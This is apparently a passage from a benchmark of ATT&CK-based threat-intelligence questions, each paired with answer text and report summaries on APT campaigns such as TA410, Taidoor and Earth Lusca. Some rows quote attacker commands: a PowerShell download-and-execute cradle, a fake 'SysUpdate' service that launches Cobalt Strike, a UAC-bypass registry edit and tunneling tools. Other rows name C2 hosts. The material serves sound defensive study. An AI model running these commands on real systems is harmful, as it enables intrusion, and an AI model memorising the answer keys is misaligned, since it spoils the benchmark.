Execution: The second PE file begins by checking the environment using the CheckRemoteDebuggerPresent function as an anti-forensic technique. It then creates persistence through a RunOnce key in the registry and uses the CreateToolhelp32snapshot function to get a snapshot of all processes, targeting the explorer process.
Persistence: Persistence is achieved by creating a RunOnce key in the registry (\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce Putty explorer.exe CurrentUserC:\file.exe).
Defense Evasion: The malware employs defense evasion by checking the environment using the CheckRemoteDebuggerPresent function and by using Process Hollowing to inject into a process for communication with the C2.
Command and Control: The malware establishes command and control by creating a process through Process Hollowing, which awaits further instructions from the C2. However, the C2 was down at the time of submission to VirusTotal, preventing further analysis.
Others: The malware sample is associated with APTPatchwork and is consistent with the Indian APT group Patchwork. The payload is linked to the Professional version of Inpage (2.21), commonly used in Pakistan. The C2 is hosted on Amazon CloudFront, and the payload is connected to recent events involving delegations from the Pakistan Naval and Air Force Academies visiting Azerbaijan.",Yes,Malware analysis about sample of APT Patchwork
2148,37,37-Persistence-T1137-Office Application Startup,"After the Execution tactic where the FlowCloud macro renames files and executes 'gup.exe' using a version of certutil.exe (Temptcm.tmp), is it likely that the FlowCloud malware will execute 'Gup.exe', which in turn executes 'EhStorAuthn.exe' to extract and install payload file components for persistence?",Persistence: The FlowCloud malware begins with the execution of 'Gup.exe' by the malicious macro which in turn executes the file 'EhStorAuthn.exe'. 'EhStorAuthn.exe' extracts the subsequent payload file components and installs them to the directory C:\Windows\Media\SystemPCAXD\ado\fc. This file also sets registry key values that store the keylogger drivers and the malware configuration as the value 'KEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\<2-4>'.,"Initial Access: Proofpoint researchers observed phishing campaigns beginning on July 10, 2019, targeting U.S. utility providers with portable executable (PE) attachments and subject lines such as 'PowerSafe energy educational courses (30-days trial)'. These campaigns continued through September 2019. In November 2019, the threat actors shifted from PE attachments to malicious macro-laden Microsoft Word documents.
Execution: The FlowCloud macro used privacy-enhanced mail ('.pem') files which were subsequently renamed to 'pense1.txt'. This file is then saved as a portable executable file named 'gup.exe' and executed using a version of the certutil.exe tool named 'Temptcm.tmp'. The FlowCloud macro introduced a new method for the delivery of the malware, utilizing a previously unobserved macro section to download the payload from a DropBox URL. If unable to retrieve the payload from that resource, a catch statement attempted to retrieve a malware resource from the URL http://ffca.caibi379[.]com/rwjh/qtinfo.txt.
Command and Control: FlowCloud malware handles configuration updates, file exfiltration, and commands as independent threads utilizing a custom binary C2 protocol. The sample analyzed utilized port 55555 for file exfiltration and port 55556 for all other data. FlowCloud communication was identified with the IP 188.131.233[.]27.
Others: Proofpoint researchers reported that LookBack malware targeted the U.S. utilities sector between July and August 2019. They continued their analysis into additional LookBack campaigns that unfolded between August 21-29, 2019. These campaigns utilized malicious macro-laden documents to deliver modular malware to targeted utility providers across the U.S. At the same time, Proofpoint identified a new malware family named FlowCloud, which gives attackers complete control over a compromised system. Both LookBack and FlowCloud malware can be attributed to a single threat actor called TA410, based on shared attachment macros, malware installation techniques, and overlapping delivery infrastructure. TA410 campaigns detected in November 2019 included TA429 (APT10)-related infrastructure used in phishing attachment delivery macros. However, Proofpoint analysts believe that intentional reuse of TA429 (APT10) techniques and infrastructure may be an attempt by threat actors to create a false flag. Therefore, they do not attribute LookBack and FlowCloud campaigns to TA429 (APT10) and track TA429 (APT10) independently of TA410 campaigns.",Yes,TA410
2156,370,370-Defense Evasion-T1055-Process Injection,"Is it likely that Smoaler will create a program file and execute it as part of its first-stage dropper after decompressing an embedded PE file, before it employs defense evasion by injecting itself into the IEXPLORE.EXE process to mask its traffic as originating from a browser?","Defense Evasion: Smoaler employs defense evasion techniques by overwriting the infected RTF file with a decoy DOC file to remove evidence of infection. It also injects itself into the IEXPLORE.EXE process to make its traffic appear to originate from a browser, thus avoiding suspicion. Additionally, Smoaler avoids injecting into Internet Explorer if processes belonging to various security products are active, as a precaution to avoid detection by security software.","Initial Access: The CTI report by SophosLabs, authored by Gabor Szappanos, details the infection vector of the Smoaler malware, which arrives via files with .DOC or .DOCX extensions, typically associated with Microsoft Word. However, these files are actually in Rich Text Format (RTF), likely chosen for its ease of manipulation to exploit the CVE-2012-0158 vulnerability. The files feature Tibetan-themed subject lines and are designed to execute shellcode upon opening on an unpatched system, leading to infection.
Execution: The report describes the execution process of the Smoaler malware, which begins with the activation of shellcode embedded in the RTF file. This shellcode is identical to that used by the PlugX malware and utilizes LZNT1 compression for the embedded executable payload. The shellcode decompresses an embedded PE file, writes it to the %TEMP% folder as DW20.DLL, and executes it. This first-stage dropper then creates another program file, drops it to disk, and runs it.
Persistence: Smoaler establishes persistence on the infected system by installing itself in two locations on the victim's computer and adding a registry value for automatic re-loading upon system reboot or user logon. The malware uses the Windows utility rundll32.exe to launch itself, as DLLs require a host program to execute.
Command and Control: The report identifies that Smoaler saves Command-and-Control (C&C) server names to the registry entry HKCU\Software\Microsoft\Windows Media\XC, which are obscured to avoid detection. The malware then attempts to connect to its C&C servers, which are known from earlier Tibet-related malware attacks.
Others: The CTI report mentions that the Smoaler malware is a continuation of the PlugX malware family, sharing many features but following a different path after initial infection stages. It also notes that the malware's main DLL is deliberately bloated to disguise its original source and that the content fetched from C&C servers is variable, depending on what the attackers choose to serve up next. The report emphasizes the importance of proactivity and prevention in dealing with malware like Smoaler.",Yes,Plugx_Smoaler
2157,370,370-Persistence-T1547-Boot or Logon Autostart Execution,"After executing its embedded payload by writing it to the %TEMP% folder and running it, is Smoaler likely to establish persistence by using rundll32.exe for automatic re-loading upon system reboot or user logon before overwriting the infected RTF file with a decoy DOC file to evade detection?","Persistence: Smoaler establishes persistence on the infected system by installing itself in two locations on the victim's computer and adding a registry value for automatic re-loading upon system reboot or user logon. The malware uses the Windows utility rundll32.exe to launch itself, as DLLs require a host program to execute.","Initial Access: The CTI report by SophosLabs, authored by Gabor Szappanos, details the infection vector of the Smoaler malware, which arrives via files with .DOC or .DOCX extensions, typically associated with Microsoft Word. However, these files are actually in Rich Text Format (RTF), likely chosen for its ease of manipulation to exploit the CVE-2012-0158 vulnerability. The files feature Tibetan-themed subject lines and are designed to execute shellcode upon opening on an unpatched system, leading to infection.
Execution: The report describes the execution process of the Smoaler malware, which begins with the activation of shellcode embedded in the RTF file. This shellcode is identical to that used by the PlugX malware and utilizes LZNT1 compression for the embedded executable payload. The shellcode decompresses an embedded PE file, writes it to the %TEMP% folder as DW20.DLL, and executes it. This first-stage dropper then creates another program file, drops it to disk, and runs it.
Defense Evasion: Smoaler employs defense evasion techniques by overwriting the infected RTF file with a decoy DOC file to remove evidence of infection. It also injects itself into the IEXPLORE.EXE process to make its traffic appear to originate from a browser, thus avoiding suspicion. Additionally, Smoaler avoids injecting into Internet Explorer if processes belonging to various security products are active, as a precaution to avoid detection by security software.
Command and Control: The report identifies that Smoaler saves Command-and-Control (C&C) server names to the registry entry HKCU\Software\Microsoft\Windows Media\XC, which are obscured to avoid detection. The malware then attempts to connect to its C&C servers, which are known from earlier Tibet-related malware attacks.
Others: The CTI report mentions that the Smoaler malware is a continuation of the PlugX malware family, sharing many features but following a different path after initial infection stages. It also notes that the malware's main DLL is deliberately bloated to disguise its original source and that the content fetched from C&C servers is variable, depending on what the attackers choose to serve up next. The report emphasizes the importance of proactivity and prevention in dealing with malware like Smoaler.",Yes,Plugx_Smoaler
2160,372,372-Command and Control-T1568-Dynamic Resolution,"After utilizing spear phishing emails to gain initial access and establishing a persistent foothold through C2 beaconing, is it likely that APT35's C2 will operate using dynamic resolution, including domains such as cortanaservice[.]com, to communicate with its infrastructure while evading detection?",Command and Control: Darktrace detected APT35's C2 activity without relying on signatures or threat intelligence. The C2 destinations included known malicious domains such as cortanaservice[.]com.,"Initial Access: APT35, also known as Charming Kitten, Imperial Kitten, or Tortoiseshell, infiltrated a corporate device likely through a spear phishing email. This initial access was undetected until Darktrace's Cyber AI was deployed, which later identified the compromised device.
Persistence: The infected device exhibited persistent command and control (C2) beaconing, indicating that APT35 maintained a foothold within the system, lying low and awaiting further instructions.
Defense Evasion: APT35 managed to evade detection by conducting minimal activity ('lying low') and avoiding triggering security alerts. The group's presence went unnoticed by the organization's existing security measures until Darktrace's Cyber AI identified the unusual C2 traffic.
Discovery: Darktrace's Cyber AI Analyst began analyzing the infected device once the C2 was detected, automating the investigation process and reducing time to triage by 92%.
Lateral Movement: The internal security team verified with Darktrace that no lateral movement or data exfiltration had occurred following the C2 beaconing detection.
Others: Max Heinemeyer, Director of Threat Hunting at Darktrace, authored the blog post detailing the discovery of APT35's activity. The post highlights the value of self-learning AI in detecting pre-existing infections and 'low and slow' attacks. Darktrace's Proactive Threat Notifications and Antigena could have autonomously enforced normal activity for the device, preventing the C2 traffic without interrupting regular business workflows.",Yes,APT35 ‘Charming Kitten' discovered in a pre-infected environment _ Blog _ Darktrace
2165,373,373-Defense Evasion-T1027-Obfuscated Files or Information,"After ensuring persistence by registering the main C&C module ""WINDOWSUPDATANEY.DLL"" as a service named ""Windowsupdata"" and using mutexes like ""SD_2013 Is Running!"" to prevent multiple instances of itself, is it likely that the NetTraveler malware will use a simple encryption scheme to obfuscate its configuration before revealing C&C servers such as ""uyghurinfo[.]com"" through decryption using the provided algorithm?","Defense Evasion: The malware uses a simple encryption scheme to hide its configuration, which is stored in the ""SYSTEM"" folder. The encryption can be decrypted with the algorithm provided, revealing the C&C server ""uyghurinfo[.]com"" among others.","Initial Access: Earlier this year, an uptick in attacks against Uyghur and Tibetan supporters was observed, utilizing an updated version of the NetTraveler backdoor. A targeted spear-phishing email directed at Uyghur activists in March 2014 contained two attachments: a non-malicious JPG file and a malicious Microsoft Word .DOC file named ""Sabiq sot xadimi gulnar abletning qeyin-Qistaqta olgenlikiashkarilanmaqta.doc"" with an MD5 hash of b2385963d3afece16bd7478b4cf290ce and a size of 381,667 bytes. The .DOC file exploited the CVE-2012-0158 vulnerability, detected as Exploit.MSWord.CVE-2012-0158.db, to drop the main module ""net.exe"", which installs other files including the main C&C module into ""%SystemRoot%\system32\Windowsupdataney.dll"".
Persistence: The malware installs a main C&C module, ""WINDOWSUPDATANEY.DLL"" with an MD5 hash of c13c79ad874215cfec8d318468e3d116 and a size of 37,888 bytes, by registering it as a service named ""Windowsupdata"" through a Windows Batch file ""DOT.BAT"", detected as Trojan.BAT.Tiny.b. The malware ensures it isn't running multiple times by using mutexes such as ""SD_2013 Is Running!"" and others like ""Boat-12 Is Running!"", ""DocHunter2012 Is Running!"", and ""NetTravler Is Running!"".
Command and Control: The malware communicates with C&C servers such as ""ssdcru[.]com"", ""uygurinfo[.]com"", ""samedone[.]com"", ""gobackto[.]net"", ""worksware[.]net"", ""jojomic[.]com"", ""angellost[.]net"", and ""husden[.]com"". The IP locations and registrars for these domains are provided, with recommendations to block these hosts in firewalls.
Others: The NetTraveler APT, active for 10 years, targets various sectors with a focus on diplomatic, government, and military targets. Recent interests include space exploration, nano-technology, energy production, nuclear power, lasers, medicine, and communications. The targeting of Uyghur and Tibetan activists is a consistent aspect of their activities.",Yes,NetTraveler_Makeover_10th_Birthday
2169,374,374-Reconnaissance-T1598-Phishing for Information,Is it likely that the Freakyshelly attackers would gain initial access through OLE2 format documents containing embedded links in spear phishing emails after using a technique in which Microsoft Word sends a GET request to inform the attackers about the installed software during reconnaissance?,"Reconnaissance: The CTI report by Securelist authors Alexander Liskin, Anton Ivanov, and Andrey Kryukov, dated September 18, 2017, details a reconnaissance technique used in the Freakyshelly targeted attack. The attackers utilized spear phishing emails with OLE2 format attachments that contained no active content but had links to PHP scripts on third-party web resources. When opened in Microsoft Word, the application sent a GET request to one of the links, thereby informing the attackers about the software installed on the victim's computer, including the Microsoft Office version.","Initial Access: The CTI report indicates that the initial access vector in the Freakyshelly targeted attack was through spear phishing emails. The emails contained OLE2 format documents with embedded links that, when opened in Microsoft Word, would send a GET request to the attacker's server.
Defense Evasion: The CTI report describes a defense evasion technique where the attackers used an undocumented Word feature to avoid detection. The documents attached to the spear phishing emails contained no macros, exploits, or any other active content, making them appear benign and bypassing security measures.
Others: The CTI report uncovers an undocumented feature in Microsoft Word that was abused by attackers. The feature involves the INCLUDEPICTURE field, which can contain a link to an image. However, in the attack, the link was in Unicode, causing Word to ignore it but still follow a URL attached to a form within the document. This URL was the actual link that Word followed when the document was opened, leading to the attackers' server. The report also notes that this feature is present in Microsoft Office for iOS and Android but not in LibreOffice or OpenOffice. Kaspersky Lab's security products can detect the use of this technique and find links embedded in documents using the same method.",Yes,An (un)documented Word feature abused by attackers _ Securelist
2173,375,375-Command and Control-T1573-Encrypted Channel,"After Taidoor malware evades defenses by obfuscating MAC addresses and utilizing them as RC4 encryption keys for network communication, is it likely that the malware will communicate with C&C servers, install an RC4-encrypted executable file, and create an autorun registry entry during its command and control phase?","Command and Control: The Taidoor malware communicates with C&C servers using HTTP and RC4 encryption. The initial request to the C&C server includes the victim's MAC address, which is used as a key to encrypt data exchanged between the victim's machine and the C&C server. The malware installs an RC4-encrypted executable file in the memory space of a known Windows Service Process and creates an autorun registry entry for persistence.","Reconnaissance: The Taidoor campaign, primarily targeting Taiwanese government organizations, utilized social engineering tactics by spoofing Taiwanese government email addresses and sending socially engineered emails in Chinese, leveraging Taiwan-themed issues. The attackers sent out malicious documents and maintained several IP addresses for command and control.
Initial Access: The Taidoor attackers used a variety of vulnerabilities as attack vectors, including a Microsoft Common Controls vulnerability (CVE-2012-0158) and Adobe Reader, Acrobat, or Flash Player vulnerabilities (CVE-2009-4324, CVE-2010-1297, CVE-2010-2883, CVE-2011-0611). They also exploited vulnerabilities in Microsoft Excel and PowerPoint (CVE-2011-1269, CVE-2009-3129) using malicious .DOC, .PDF, .XLS, and .PPT files.
Execution: The Taidoor malware, upon opening a malicious document, creates two files in the user's Temp folder, executes a small executable file, modifies the Windows Registry, and maintains persistence. The malware also allows attackers to operate an interactive shell on compromised computers and to upload and download files.
Persistence: The Taidoor malware uses a file (~dfds3.reg) to modify the Windows Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to maintain persistence on compromised systems.
Defense Evasion: The Taidoor malware produces identifiable network traffic, often directly accessing an IP address or using domain names for HTTP communication. The GET and POST requests contain a URL path with random characters and the compromised host's MAC address, which is obfuscated using a custom algorithm and used as an RC4 encryption key for subsequent network communication.
Exfiltration: The Taidoor malware has the capability to upload files from infected machines to the C&C server, which can be used to exfiltrate data or files from the victim's network.
Impact: The Taidoor malware has functionalities typically seen in Remote Access Trojans (RATs), which can lead to data theft, data destruction, and the ability to remotely terminate processes on victims' machines, potentially causing denial of service (DoS).
Others: The Taidoor campaign has been active since at least March 4, 2009, with the earliest related activities seen as far back as October 2010. The campaign has consistently discovered malware samples connected to its infrastructure, indicating ongoing compromise attempts. Trend Micro's Smart Protection Network data was used to construct a timeline of related activities and to develop indicators of compromise based on the network traffic generated by the malware.",Yes,wp_the_taidoor_campaign
2177,375,375-Persistence-T1547-Boot or Logon Autostart Execution,"After execution of the Taidoor malware that allows for interactive shell access and file upload/download capabilities, is it likely that the malware will modify the Windows Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to maintain persistence before evading defenses by obfuscating network traffic through custom algorithms and RC4 encryption?",Persistence: The Taidoor malware uses a file (~dfds3.reg) to modify the Windows Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to maintain persistence on compromised systems.,"Reconnaissance: The Taidoor campaign, primarily targeting Taiwanese government organizations, utilized social engineering tactics by spoofing Taiwanese government email addresses and sending socially engineered emails in Chinese, leveraging Taiwan-themed issues. The attackers sent out malicious documents and maintained several IP addresses for command and control.
Initial Access: The Taidoor attackers used a variety of vulnerabilities as attack vectors, including a Microsoft Common Controls vulnerability (CVE-2012-0158) and Adobe Reader, Acrobat, or Flash Player vulnerabilities (CVE-2009-4324, CVE-2010-1297, CVE-2010-2883, CVE-2011-0611). They also exploited vulnerabilities in Microsoft Excel and PowerPoint (CVE-2011-1269, CVE-2009-3129) using malicious .DOC, .PDF, .XLS, and .PPT files.
Execution: The Taidoor malware, upon opening a malicious document, creates two files in the user's Temp folder, executes a small executable file, modifies the Windows Registry, and maintains persistence. The malware also allows attackers to operate an interactive shell on compromised computers and to upload and download files.
Defense Evasion: The Taidoor malware produces identifiable network traffic, often directly accessing an IP address or using domain names for HTTP communication. The GET and POST requests contain a URL path with random characters and the compromised host's MAC address, which is obfuscated using a custom algorithm and used as an RC4 encryption key for subsequent network communication.
Command and Control: The Taidoor malware communicates with C&C servers using HTTP and RC4 encryption. The initial request to the C&C server includes the victim's MAC address, which is used as a key to encrypt data exchanged between the victim's machine and the C&C server. The malware installs an RC4-encrypted executable file in the memory space of a known Windows Service Process and creates an autorun registry entry for persistence.
Exfiltration: The Taidoor malware has the capability to upload files from infected machines to the C&C server, which can be used to exfiltrate data or files from the victim's network.
Impact: The Taidoor malware has functionalities typically seen in Remote Access Trojans (RATs), which can lead to data theft, data destruction, and the ability to remotely terminate processes on victims' machines, potentially causing denial of service (DoS).
Others: The Taidoor campaign has been active since at least March 4, 2009, with the earliest related activities seen as far back as October 2010. The campaign has consistently discovered malware samples connected to its infrastructure, indicating ongoing compromise attempts. Trend Micro's Smart Protection Network data was used to construct a timeline of related activities and to develop indicators of compromise based on the network traffic generated by the malware.",Yes,wp_the_taidoor_campaign
2183,375,375-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the Taidoor malware communicates with the C&C server using RC4 encryption and the victim's MAC address as an encryption key, is it likely that the malware will upload files to the C&C server for data exfiltration?","Exfiltration: The Taidoor malware has the capability to upload files from infected machines to the C&C server, which can be used to exfiltrate data or files from the victim's network.","Reconnaissance: The Taidoor campaign, primarily targeting Taiwanese government organizations, utilized social engineering tactics by spoofing Taiwanese government email addresses and sending socially engineered emails in Chinese, leveraging Taiwan-themed issues. The attackers sent out malicious documents and maintained several IP addresses for command and control.
Initial Access: The Taidoor attackers used a variety of vulnerabilities as attack vectors, including a Microsoft Common Controls vulnerability (CVE-2012-0158) and Adobe Reader, Acrobat, or Flash Player vulnerabilities (CVE-2009-4324, CVE-2010-1297, CVE-2010-2883, CVE-2011-0611). They also exploited vulnerabilities in Microsoft Excel and PowerPoint (CVE-2011-1269, CVE-2009-3129) using malicious .DOC, .PDF, .XLS, and .PPT files.
Execution: The Taidoor malware, upon opening a malicious document, creates two files in the user's Temp folder, executes a small executable file, modifies the Windows Registry, and maintains persistence. The malware also allows attackers to operate an interactive shell on compromised computers and to upload and download files.
Persistence: The Taidoor malware uses a file (~dfds3.reg) to modify the Windows Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to maintain persistence on compromised systems.
Defense Evasion: The Taidoor malware produces identifiable network traffic, often directly accessing an IP address or using domain names for HTTP communication. The GET and POST requests contain a URL path with random characters and the compromised host's MAC address, which is obfuscated using a custom algorithm and used as an RC4 encryption key for subsequent network communication.
Command and Control: The Taidoor malware communicates with C&C servers using HTTP and RC4 encryption. The initial request to the C&C server includes the victim's MAC address, which is used as a key to encrypt data exchanged between the victim's machine and the C&C server. The malware installs an RC4-encrypted executable file in the memory space of a known Windows Service Process and creates an autorun registry entry for persistence.
Impact: The Taidoor malware has functionalities typically seen in Remote Access Trojans (RATs), which can lead to data theft, data destruction, and the ability to remotely terminate processes on victims' machines, potentially causing denial of service (DoS).
Others: The Taidoor campaign has been active since at least March 4, 2009, with the earliest related activities seen as far back as October 2010. The campaign has consistently discovered malware samples connected to its infrastructure, indicating ongoing compromise attempts. Trend Micro's Smart Protection Network data was used to construct a timeline of related activities and to develop indicators of compromise based on the network traffic generated by the malware.",Yes,wp_the_taidoor_campaign
2186,376,376-Initial Access-T1190-Exploit Public-Facing Application,"After using tools like adfind and PowerSploit during reconnaissance to gather information about the domain and network configurations, is it likely that Earth Lusca would use malicious links in spear phishing emails or injected malicious JavaScript code on watering hole websites to achieve initial access before executing commands to create a fake system update service for deploying Cobalt Strike?","Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2187,376,376-Execution-T1059-Command and Scripting Interpreter,"Prior to employing command and scripting interpreters to execute malicious code, is it likely that Earth Lusca gathered network configurations and domain information using Windows utilities and tools like PowerSploit, followed by using spear phishing emails with malicious links or injecting malicious JavaScript into websites to achieve initial access?","Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2189,376,376-Execution-T1053-Scheduled Task/Job,"After using PowerShell scripts from PowerSploit for domain reconnaissance, is Earth Lusca likely to create tasks/jobs to execute malicious code before ensuring persistence through methods like creating services or registering initialization scripts?","Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
